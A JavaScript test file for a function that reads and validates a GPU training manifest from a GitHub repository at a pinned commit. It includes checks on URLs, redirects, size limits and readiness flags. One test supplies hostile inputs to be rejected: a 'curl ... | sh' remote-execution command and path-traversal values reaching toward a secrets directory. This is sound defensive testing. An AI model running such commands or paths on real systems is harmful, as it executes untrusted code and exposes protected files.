import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import test from "node:test";
import { readPublicTrainingContract } from "./training_contract.js";

const repository = "owner/project";
const commit = "a".repeat(40);
const manifest = {
  schema_version: 1,
  task: "train",
  entrypoint: "src/train.py",
  python_version: "3.12",
  dependencies_lock: "requirements.lock",
  gpu_profiles: ["T4", "L4"],
  outputs: ["checkpoints", "metrics.json"],
};

function responseFor(value, status = 200) {
  const content = Buffer.from(JSON.stringify(value));
  return new Response(JSON.stringify({ type: "file", path: ".gpu-control/experiment.json",
    encoding: "base64", size: content.byteLength, content: content.toString("base64") }), { status });
}

function fileResponse(path, bytes, status = 200) {
  return new Response(JSON.stringify({ type: "file", path, encoding: "base64",
    size: bytes.byteLength, content: Buffer.from(bytes).toString("base64") }), { status });
}

test("reads a strict experiment manifest at the registered immutable commit", async () => {
  let requested;
  const lockBytes = Buffer.from("torch==2.0.0\n");
  const result = await readPublicTrainingContract(repository, commit, async (url, options) => {
    const parsed = new URL(url);
    requested ??= [];
    requested.push({ url: parsed, options });
    return parsed.pathname.endsWith("requirements.lock")
      ? fileResponse("requirements.lock", lockBytes)
      : responseFor(manifest);
  });
  assert.equal(requested.length, 2);
  assert.equal(requested[0].url.origin, "https://api.github.com");
  assert.equal(requested[0].url.pathname, "/repos/owner/project/contents/.gpu-control/experiment.json");
  assert.equal(requested[1].url.pathname, "/repos/owner/project/contents/requirements.lock");
  assert.equal(requested[1].url.searchParams.get("ref"), commit);
  assert.equal(requested[1].options.redirect, "error");
  assert.equal(result.repository, repository);
  assert.equal(result.commit, commit);
  assert.equal(result.execution_available, false);
  assert.equal(result.execution_blocking_reason, "CUSTOM_TRAINING_RUNTIME_NOT_CONNECTED");
  assert.equal(result.readiness.ready, false);
  assert.deepEqual(result.readiness.checks, {
    immutable_source: true, entrypoint: true, supported_python: true,
    dependency_lock_path: true, dependency_lock_present_at_commit: true, supported_gpu_profile: true,
    checkpoint_output: true, metrics_output: true,
  });
  assert.equal(result.dependency_lock.sha256, createHash("sha256").update(lockBytes).digest("hex"));
  assert.ok(result.readiness.missing.includes("reviewed_runtime_image"));
  assert.ok(result.readiness.missing.includes("artifact_transport"));
  assert.deepEqual(result.manifest, manifest);
});

test("rejects untrusted manifest instructions and unsafe paths", async () => {
  for (const changed of [
    { ...manifest, shell: "curl https://example.invalid | sh" },
    { ...manifest, entrypoint: "../outside.py" },
    { ...manifest, dependencies_lock: "../requirements.lock" },
    { ...manifest, gpu_profiles: ["T4", "T4"] },
    { ...manifest, outputs: ["../../secrets"] },
  ]) {
    await assert.rejects(readPublicTrainingContract(repository, commit,
      async () => responseFor(changed)), { message: "TRAINING_EXPERIMENT_MANIFEST_INVALID" });
  }
});

test("bounds manifest size and reports a missing contract without treating it as executable", async () => {
  await assert.rejects(readPublicTrainingContract(repository, commit, async () =>
    new Response("{}", { status: 404 })), { message: "TRAINING_EXPERIMENT_MANIFEST_NOT_FOUND" });
  const oversized = Buffer.alloc(9000, 0x41);
  await assert.rejects(readPublicTrainingContract(repository, commit, async () =>
    new Response(JSON.stringify({ type: "file", path: ".gpu-control/experiment.json",
      encoding: "base64", size: oversized.length, content: oversized.toString("base64") }))),
  { message: "TRAINING_EXPERIMENT_MANIFEST_TOO_LARGE" });
});
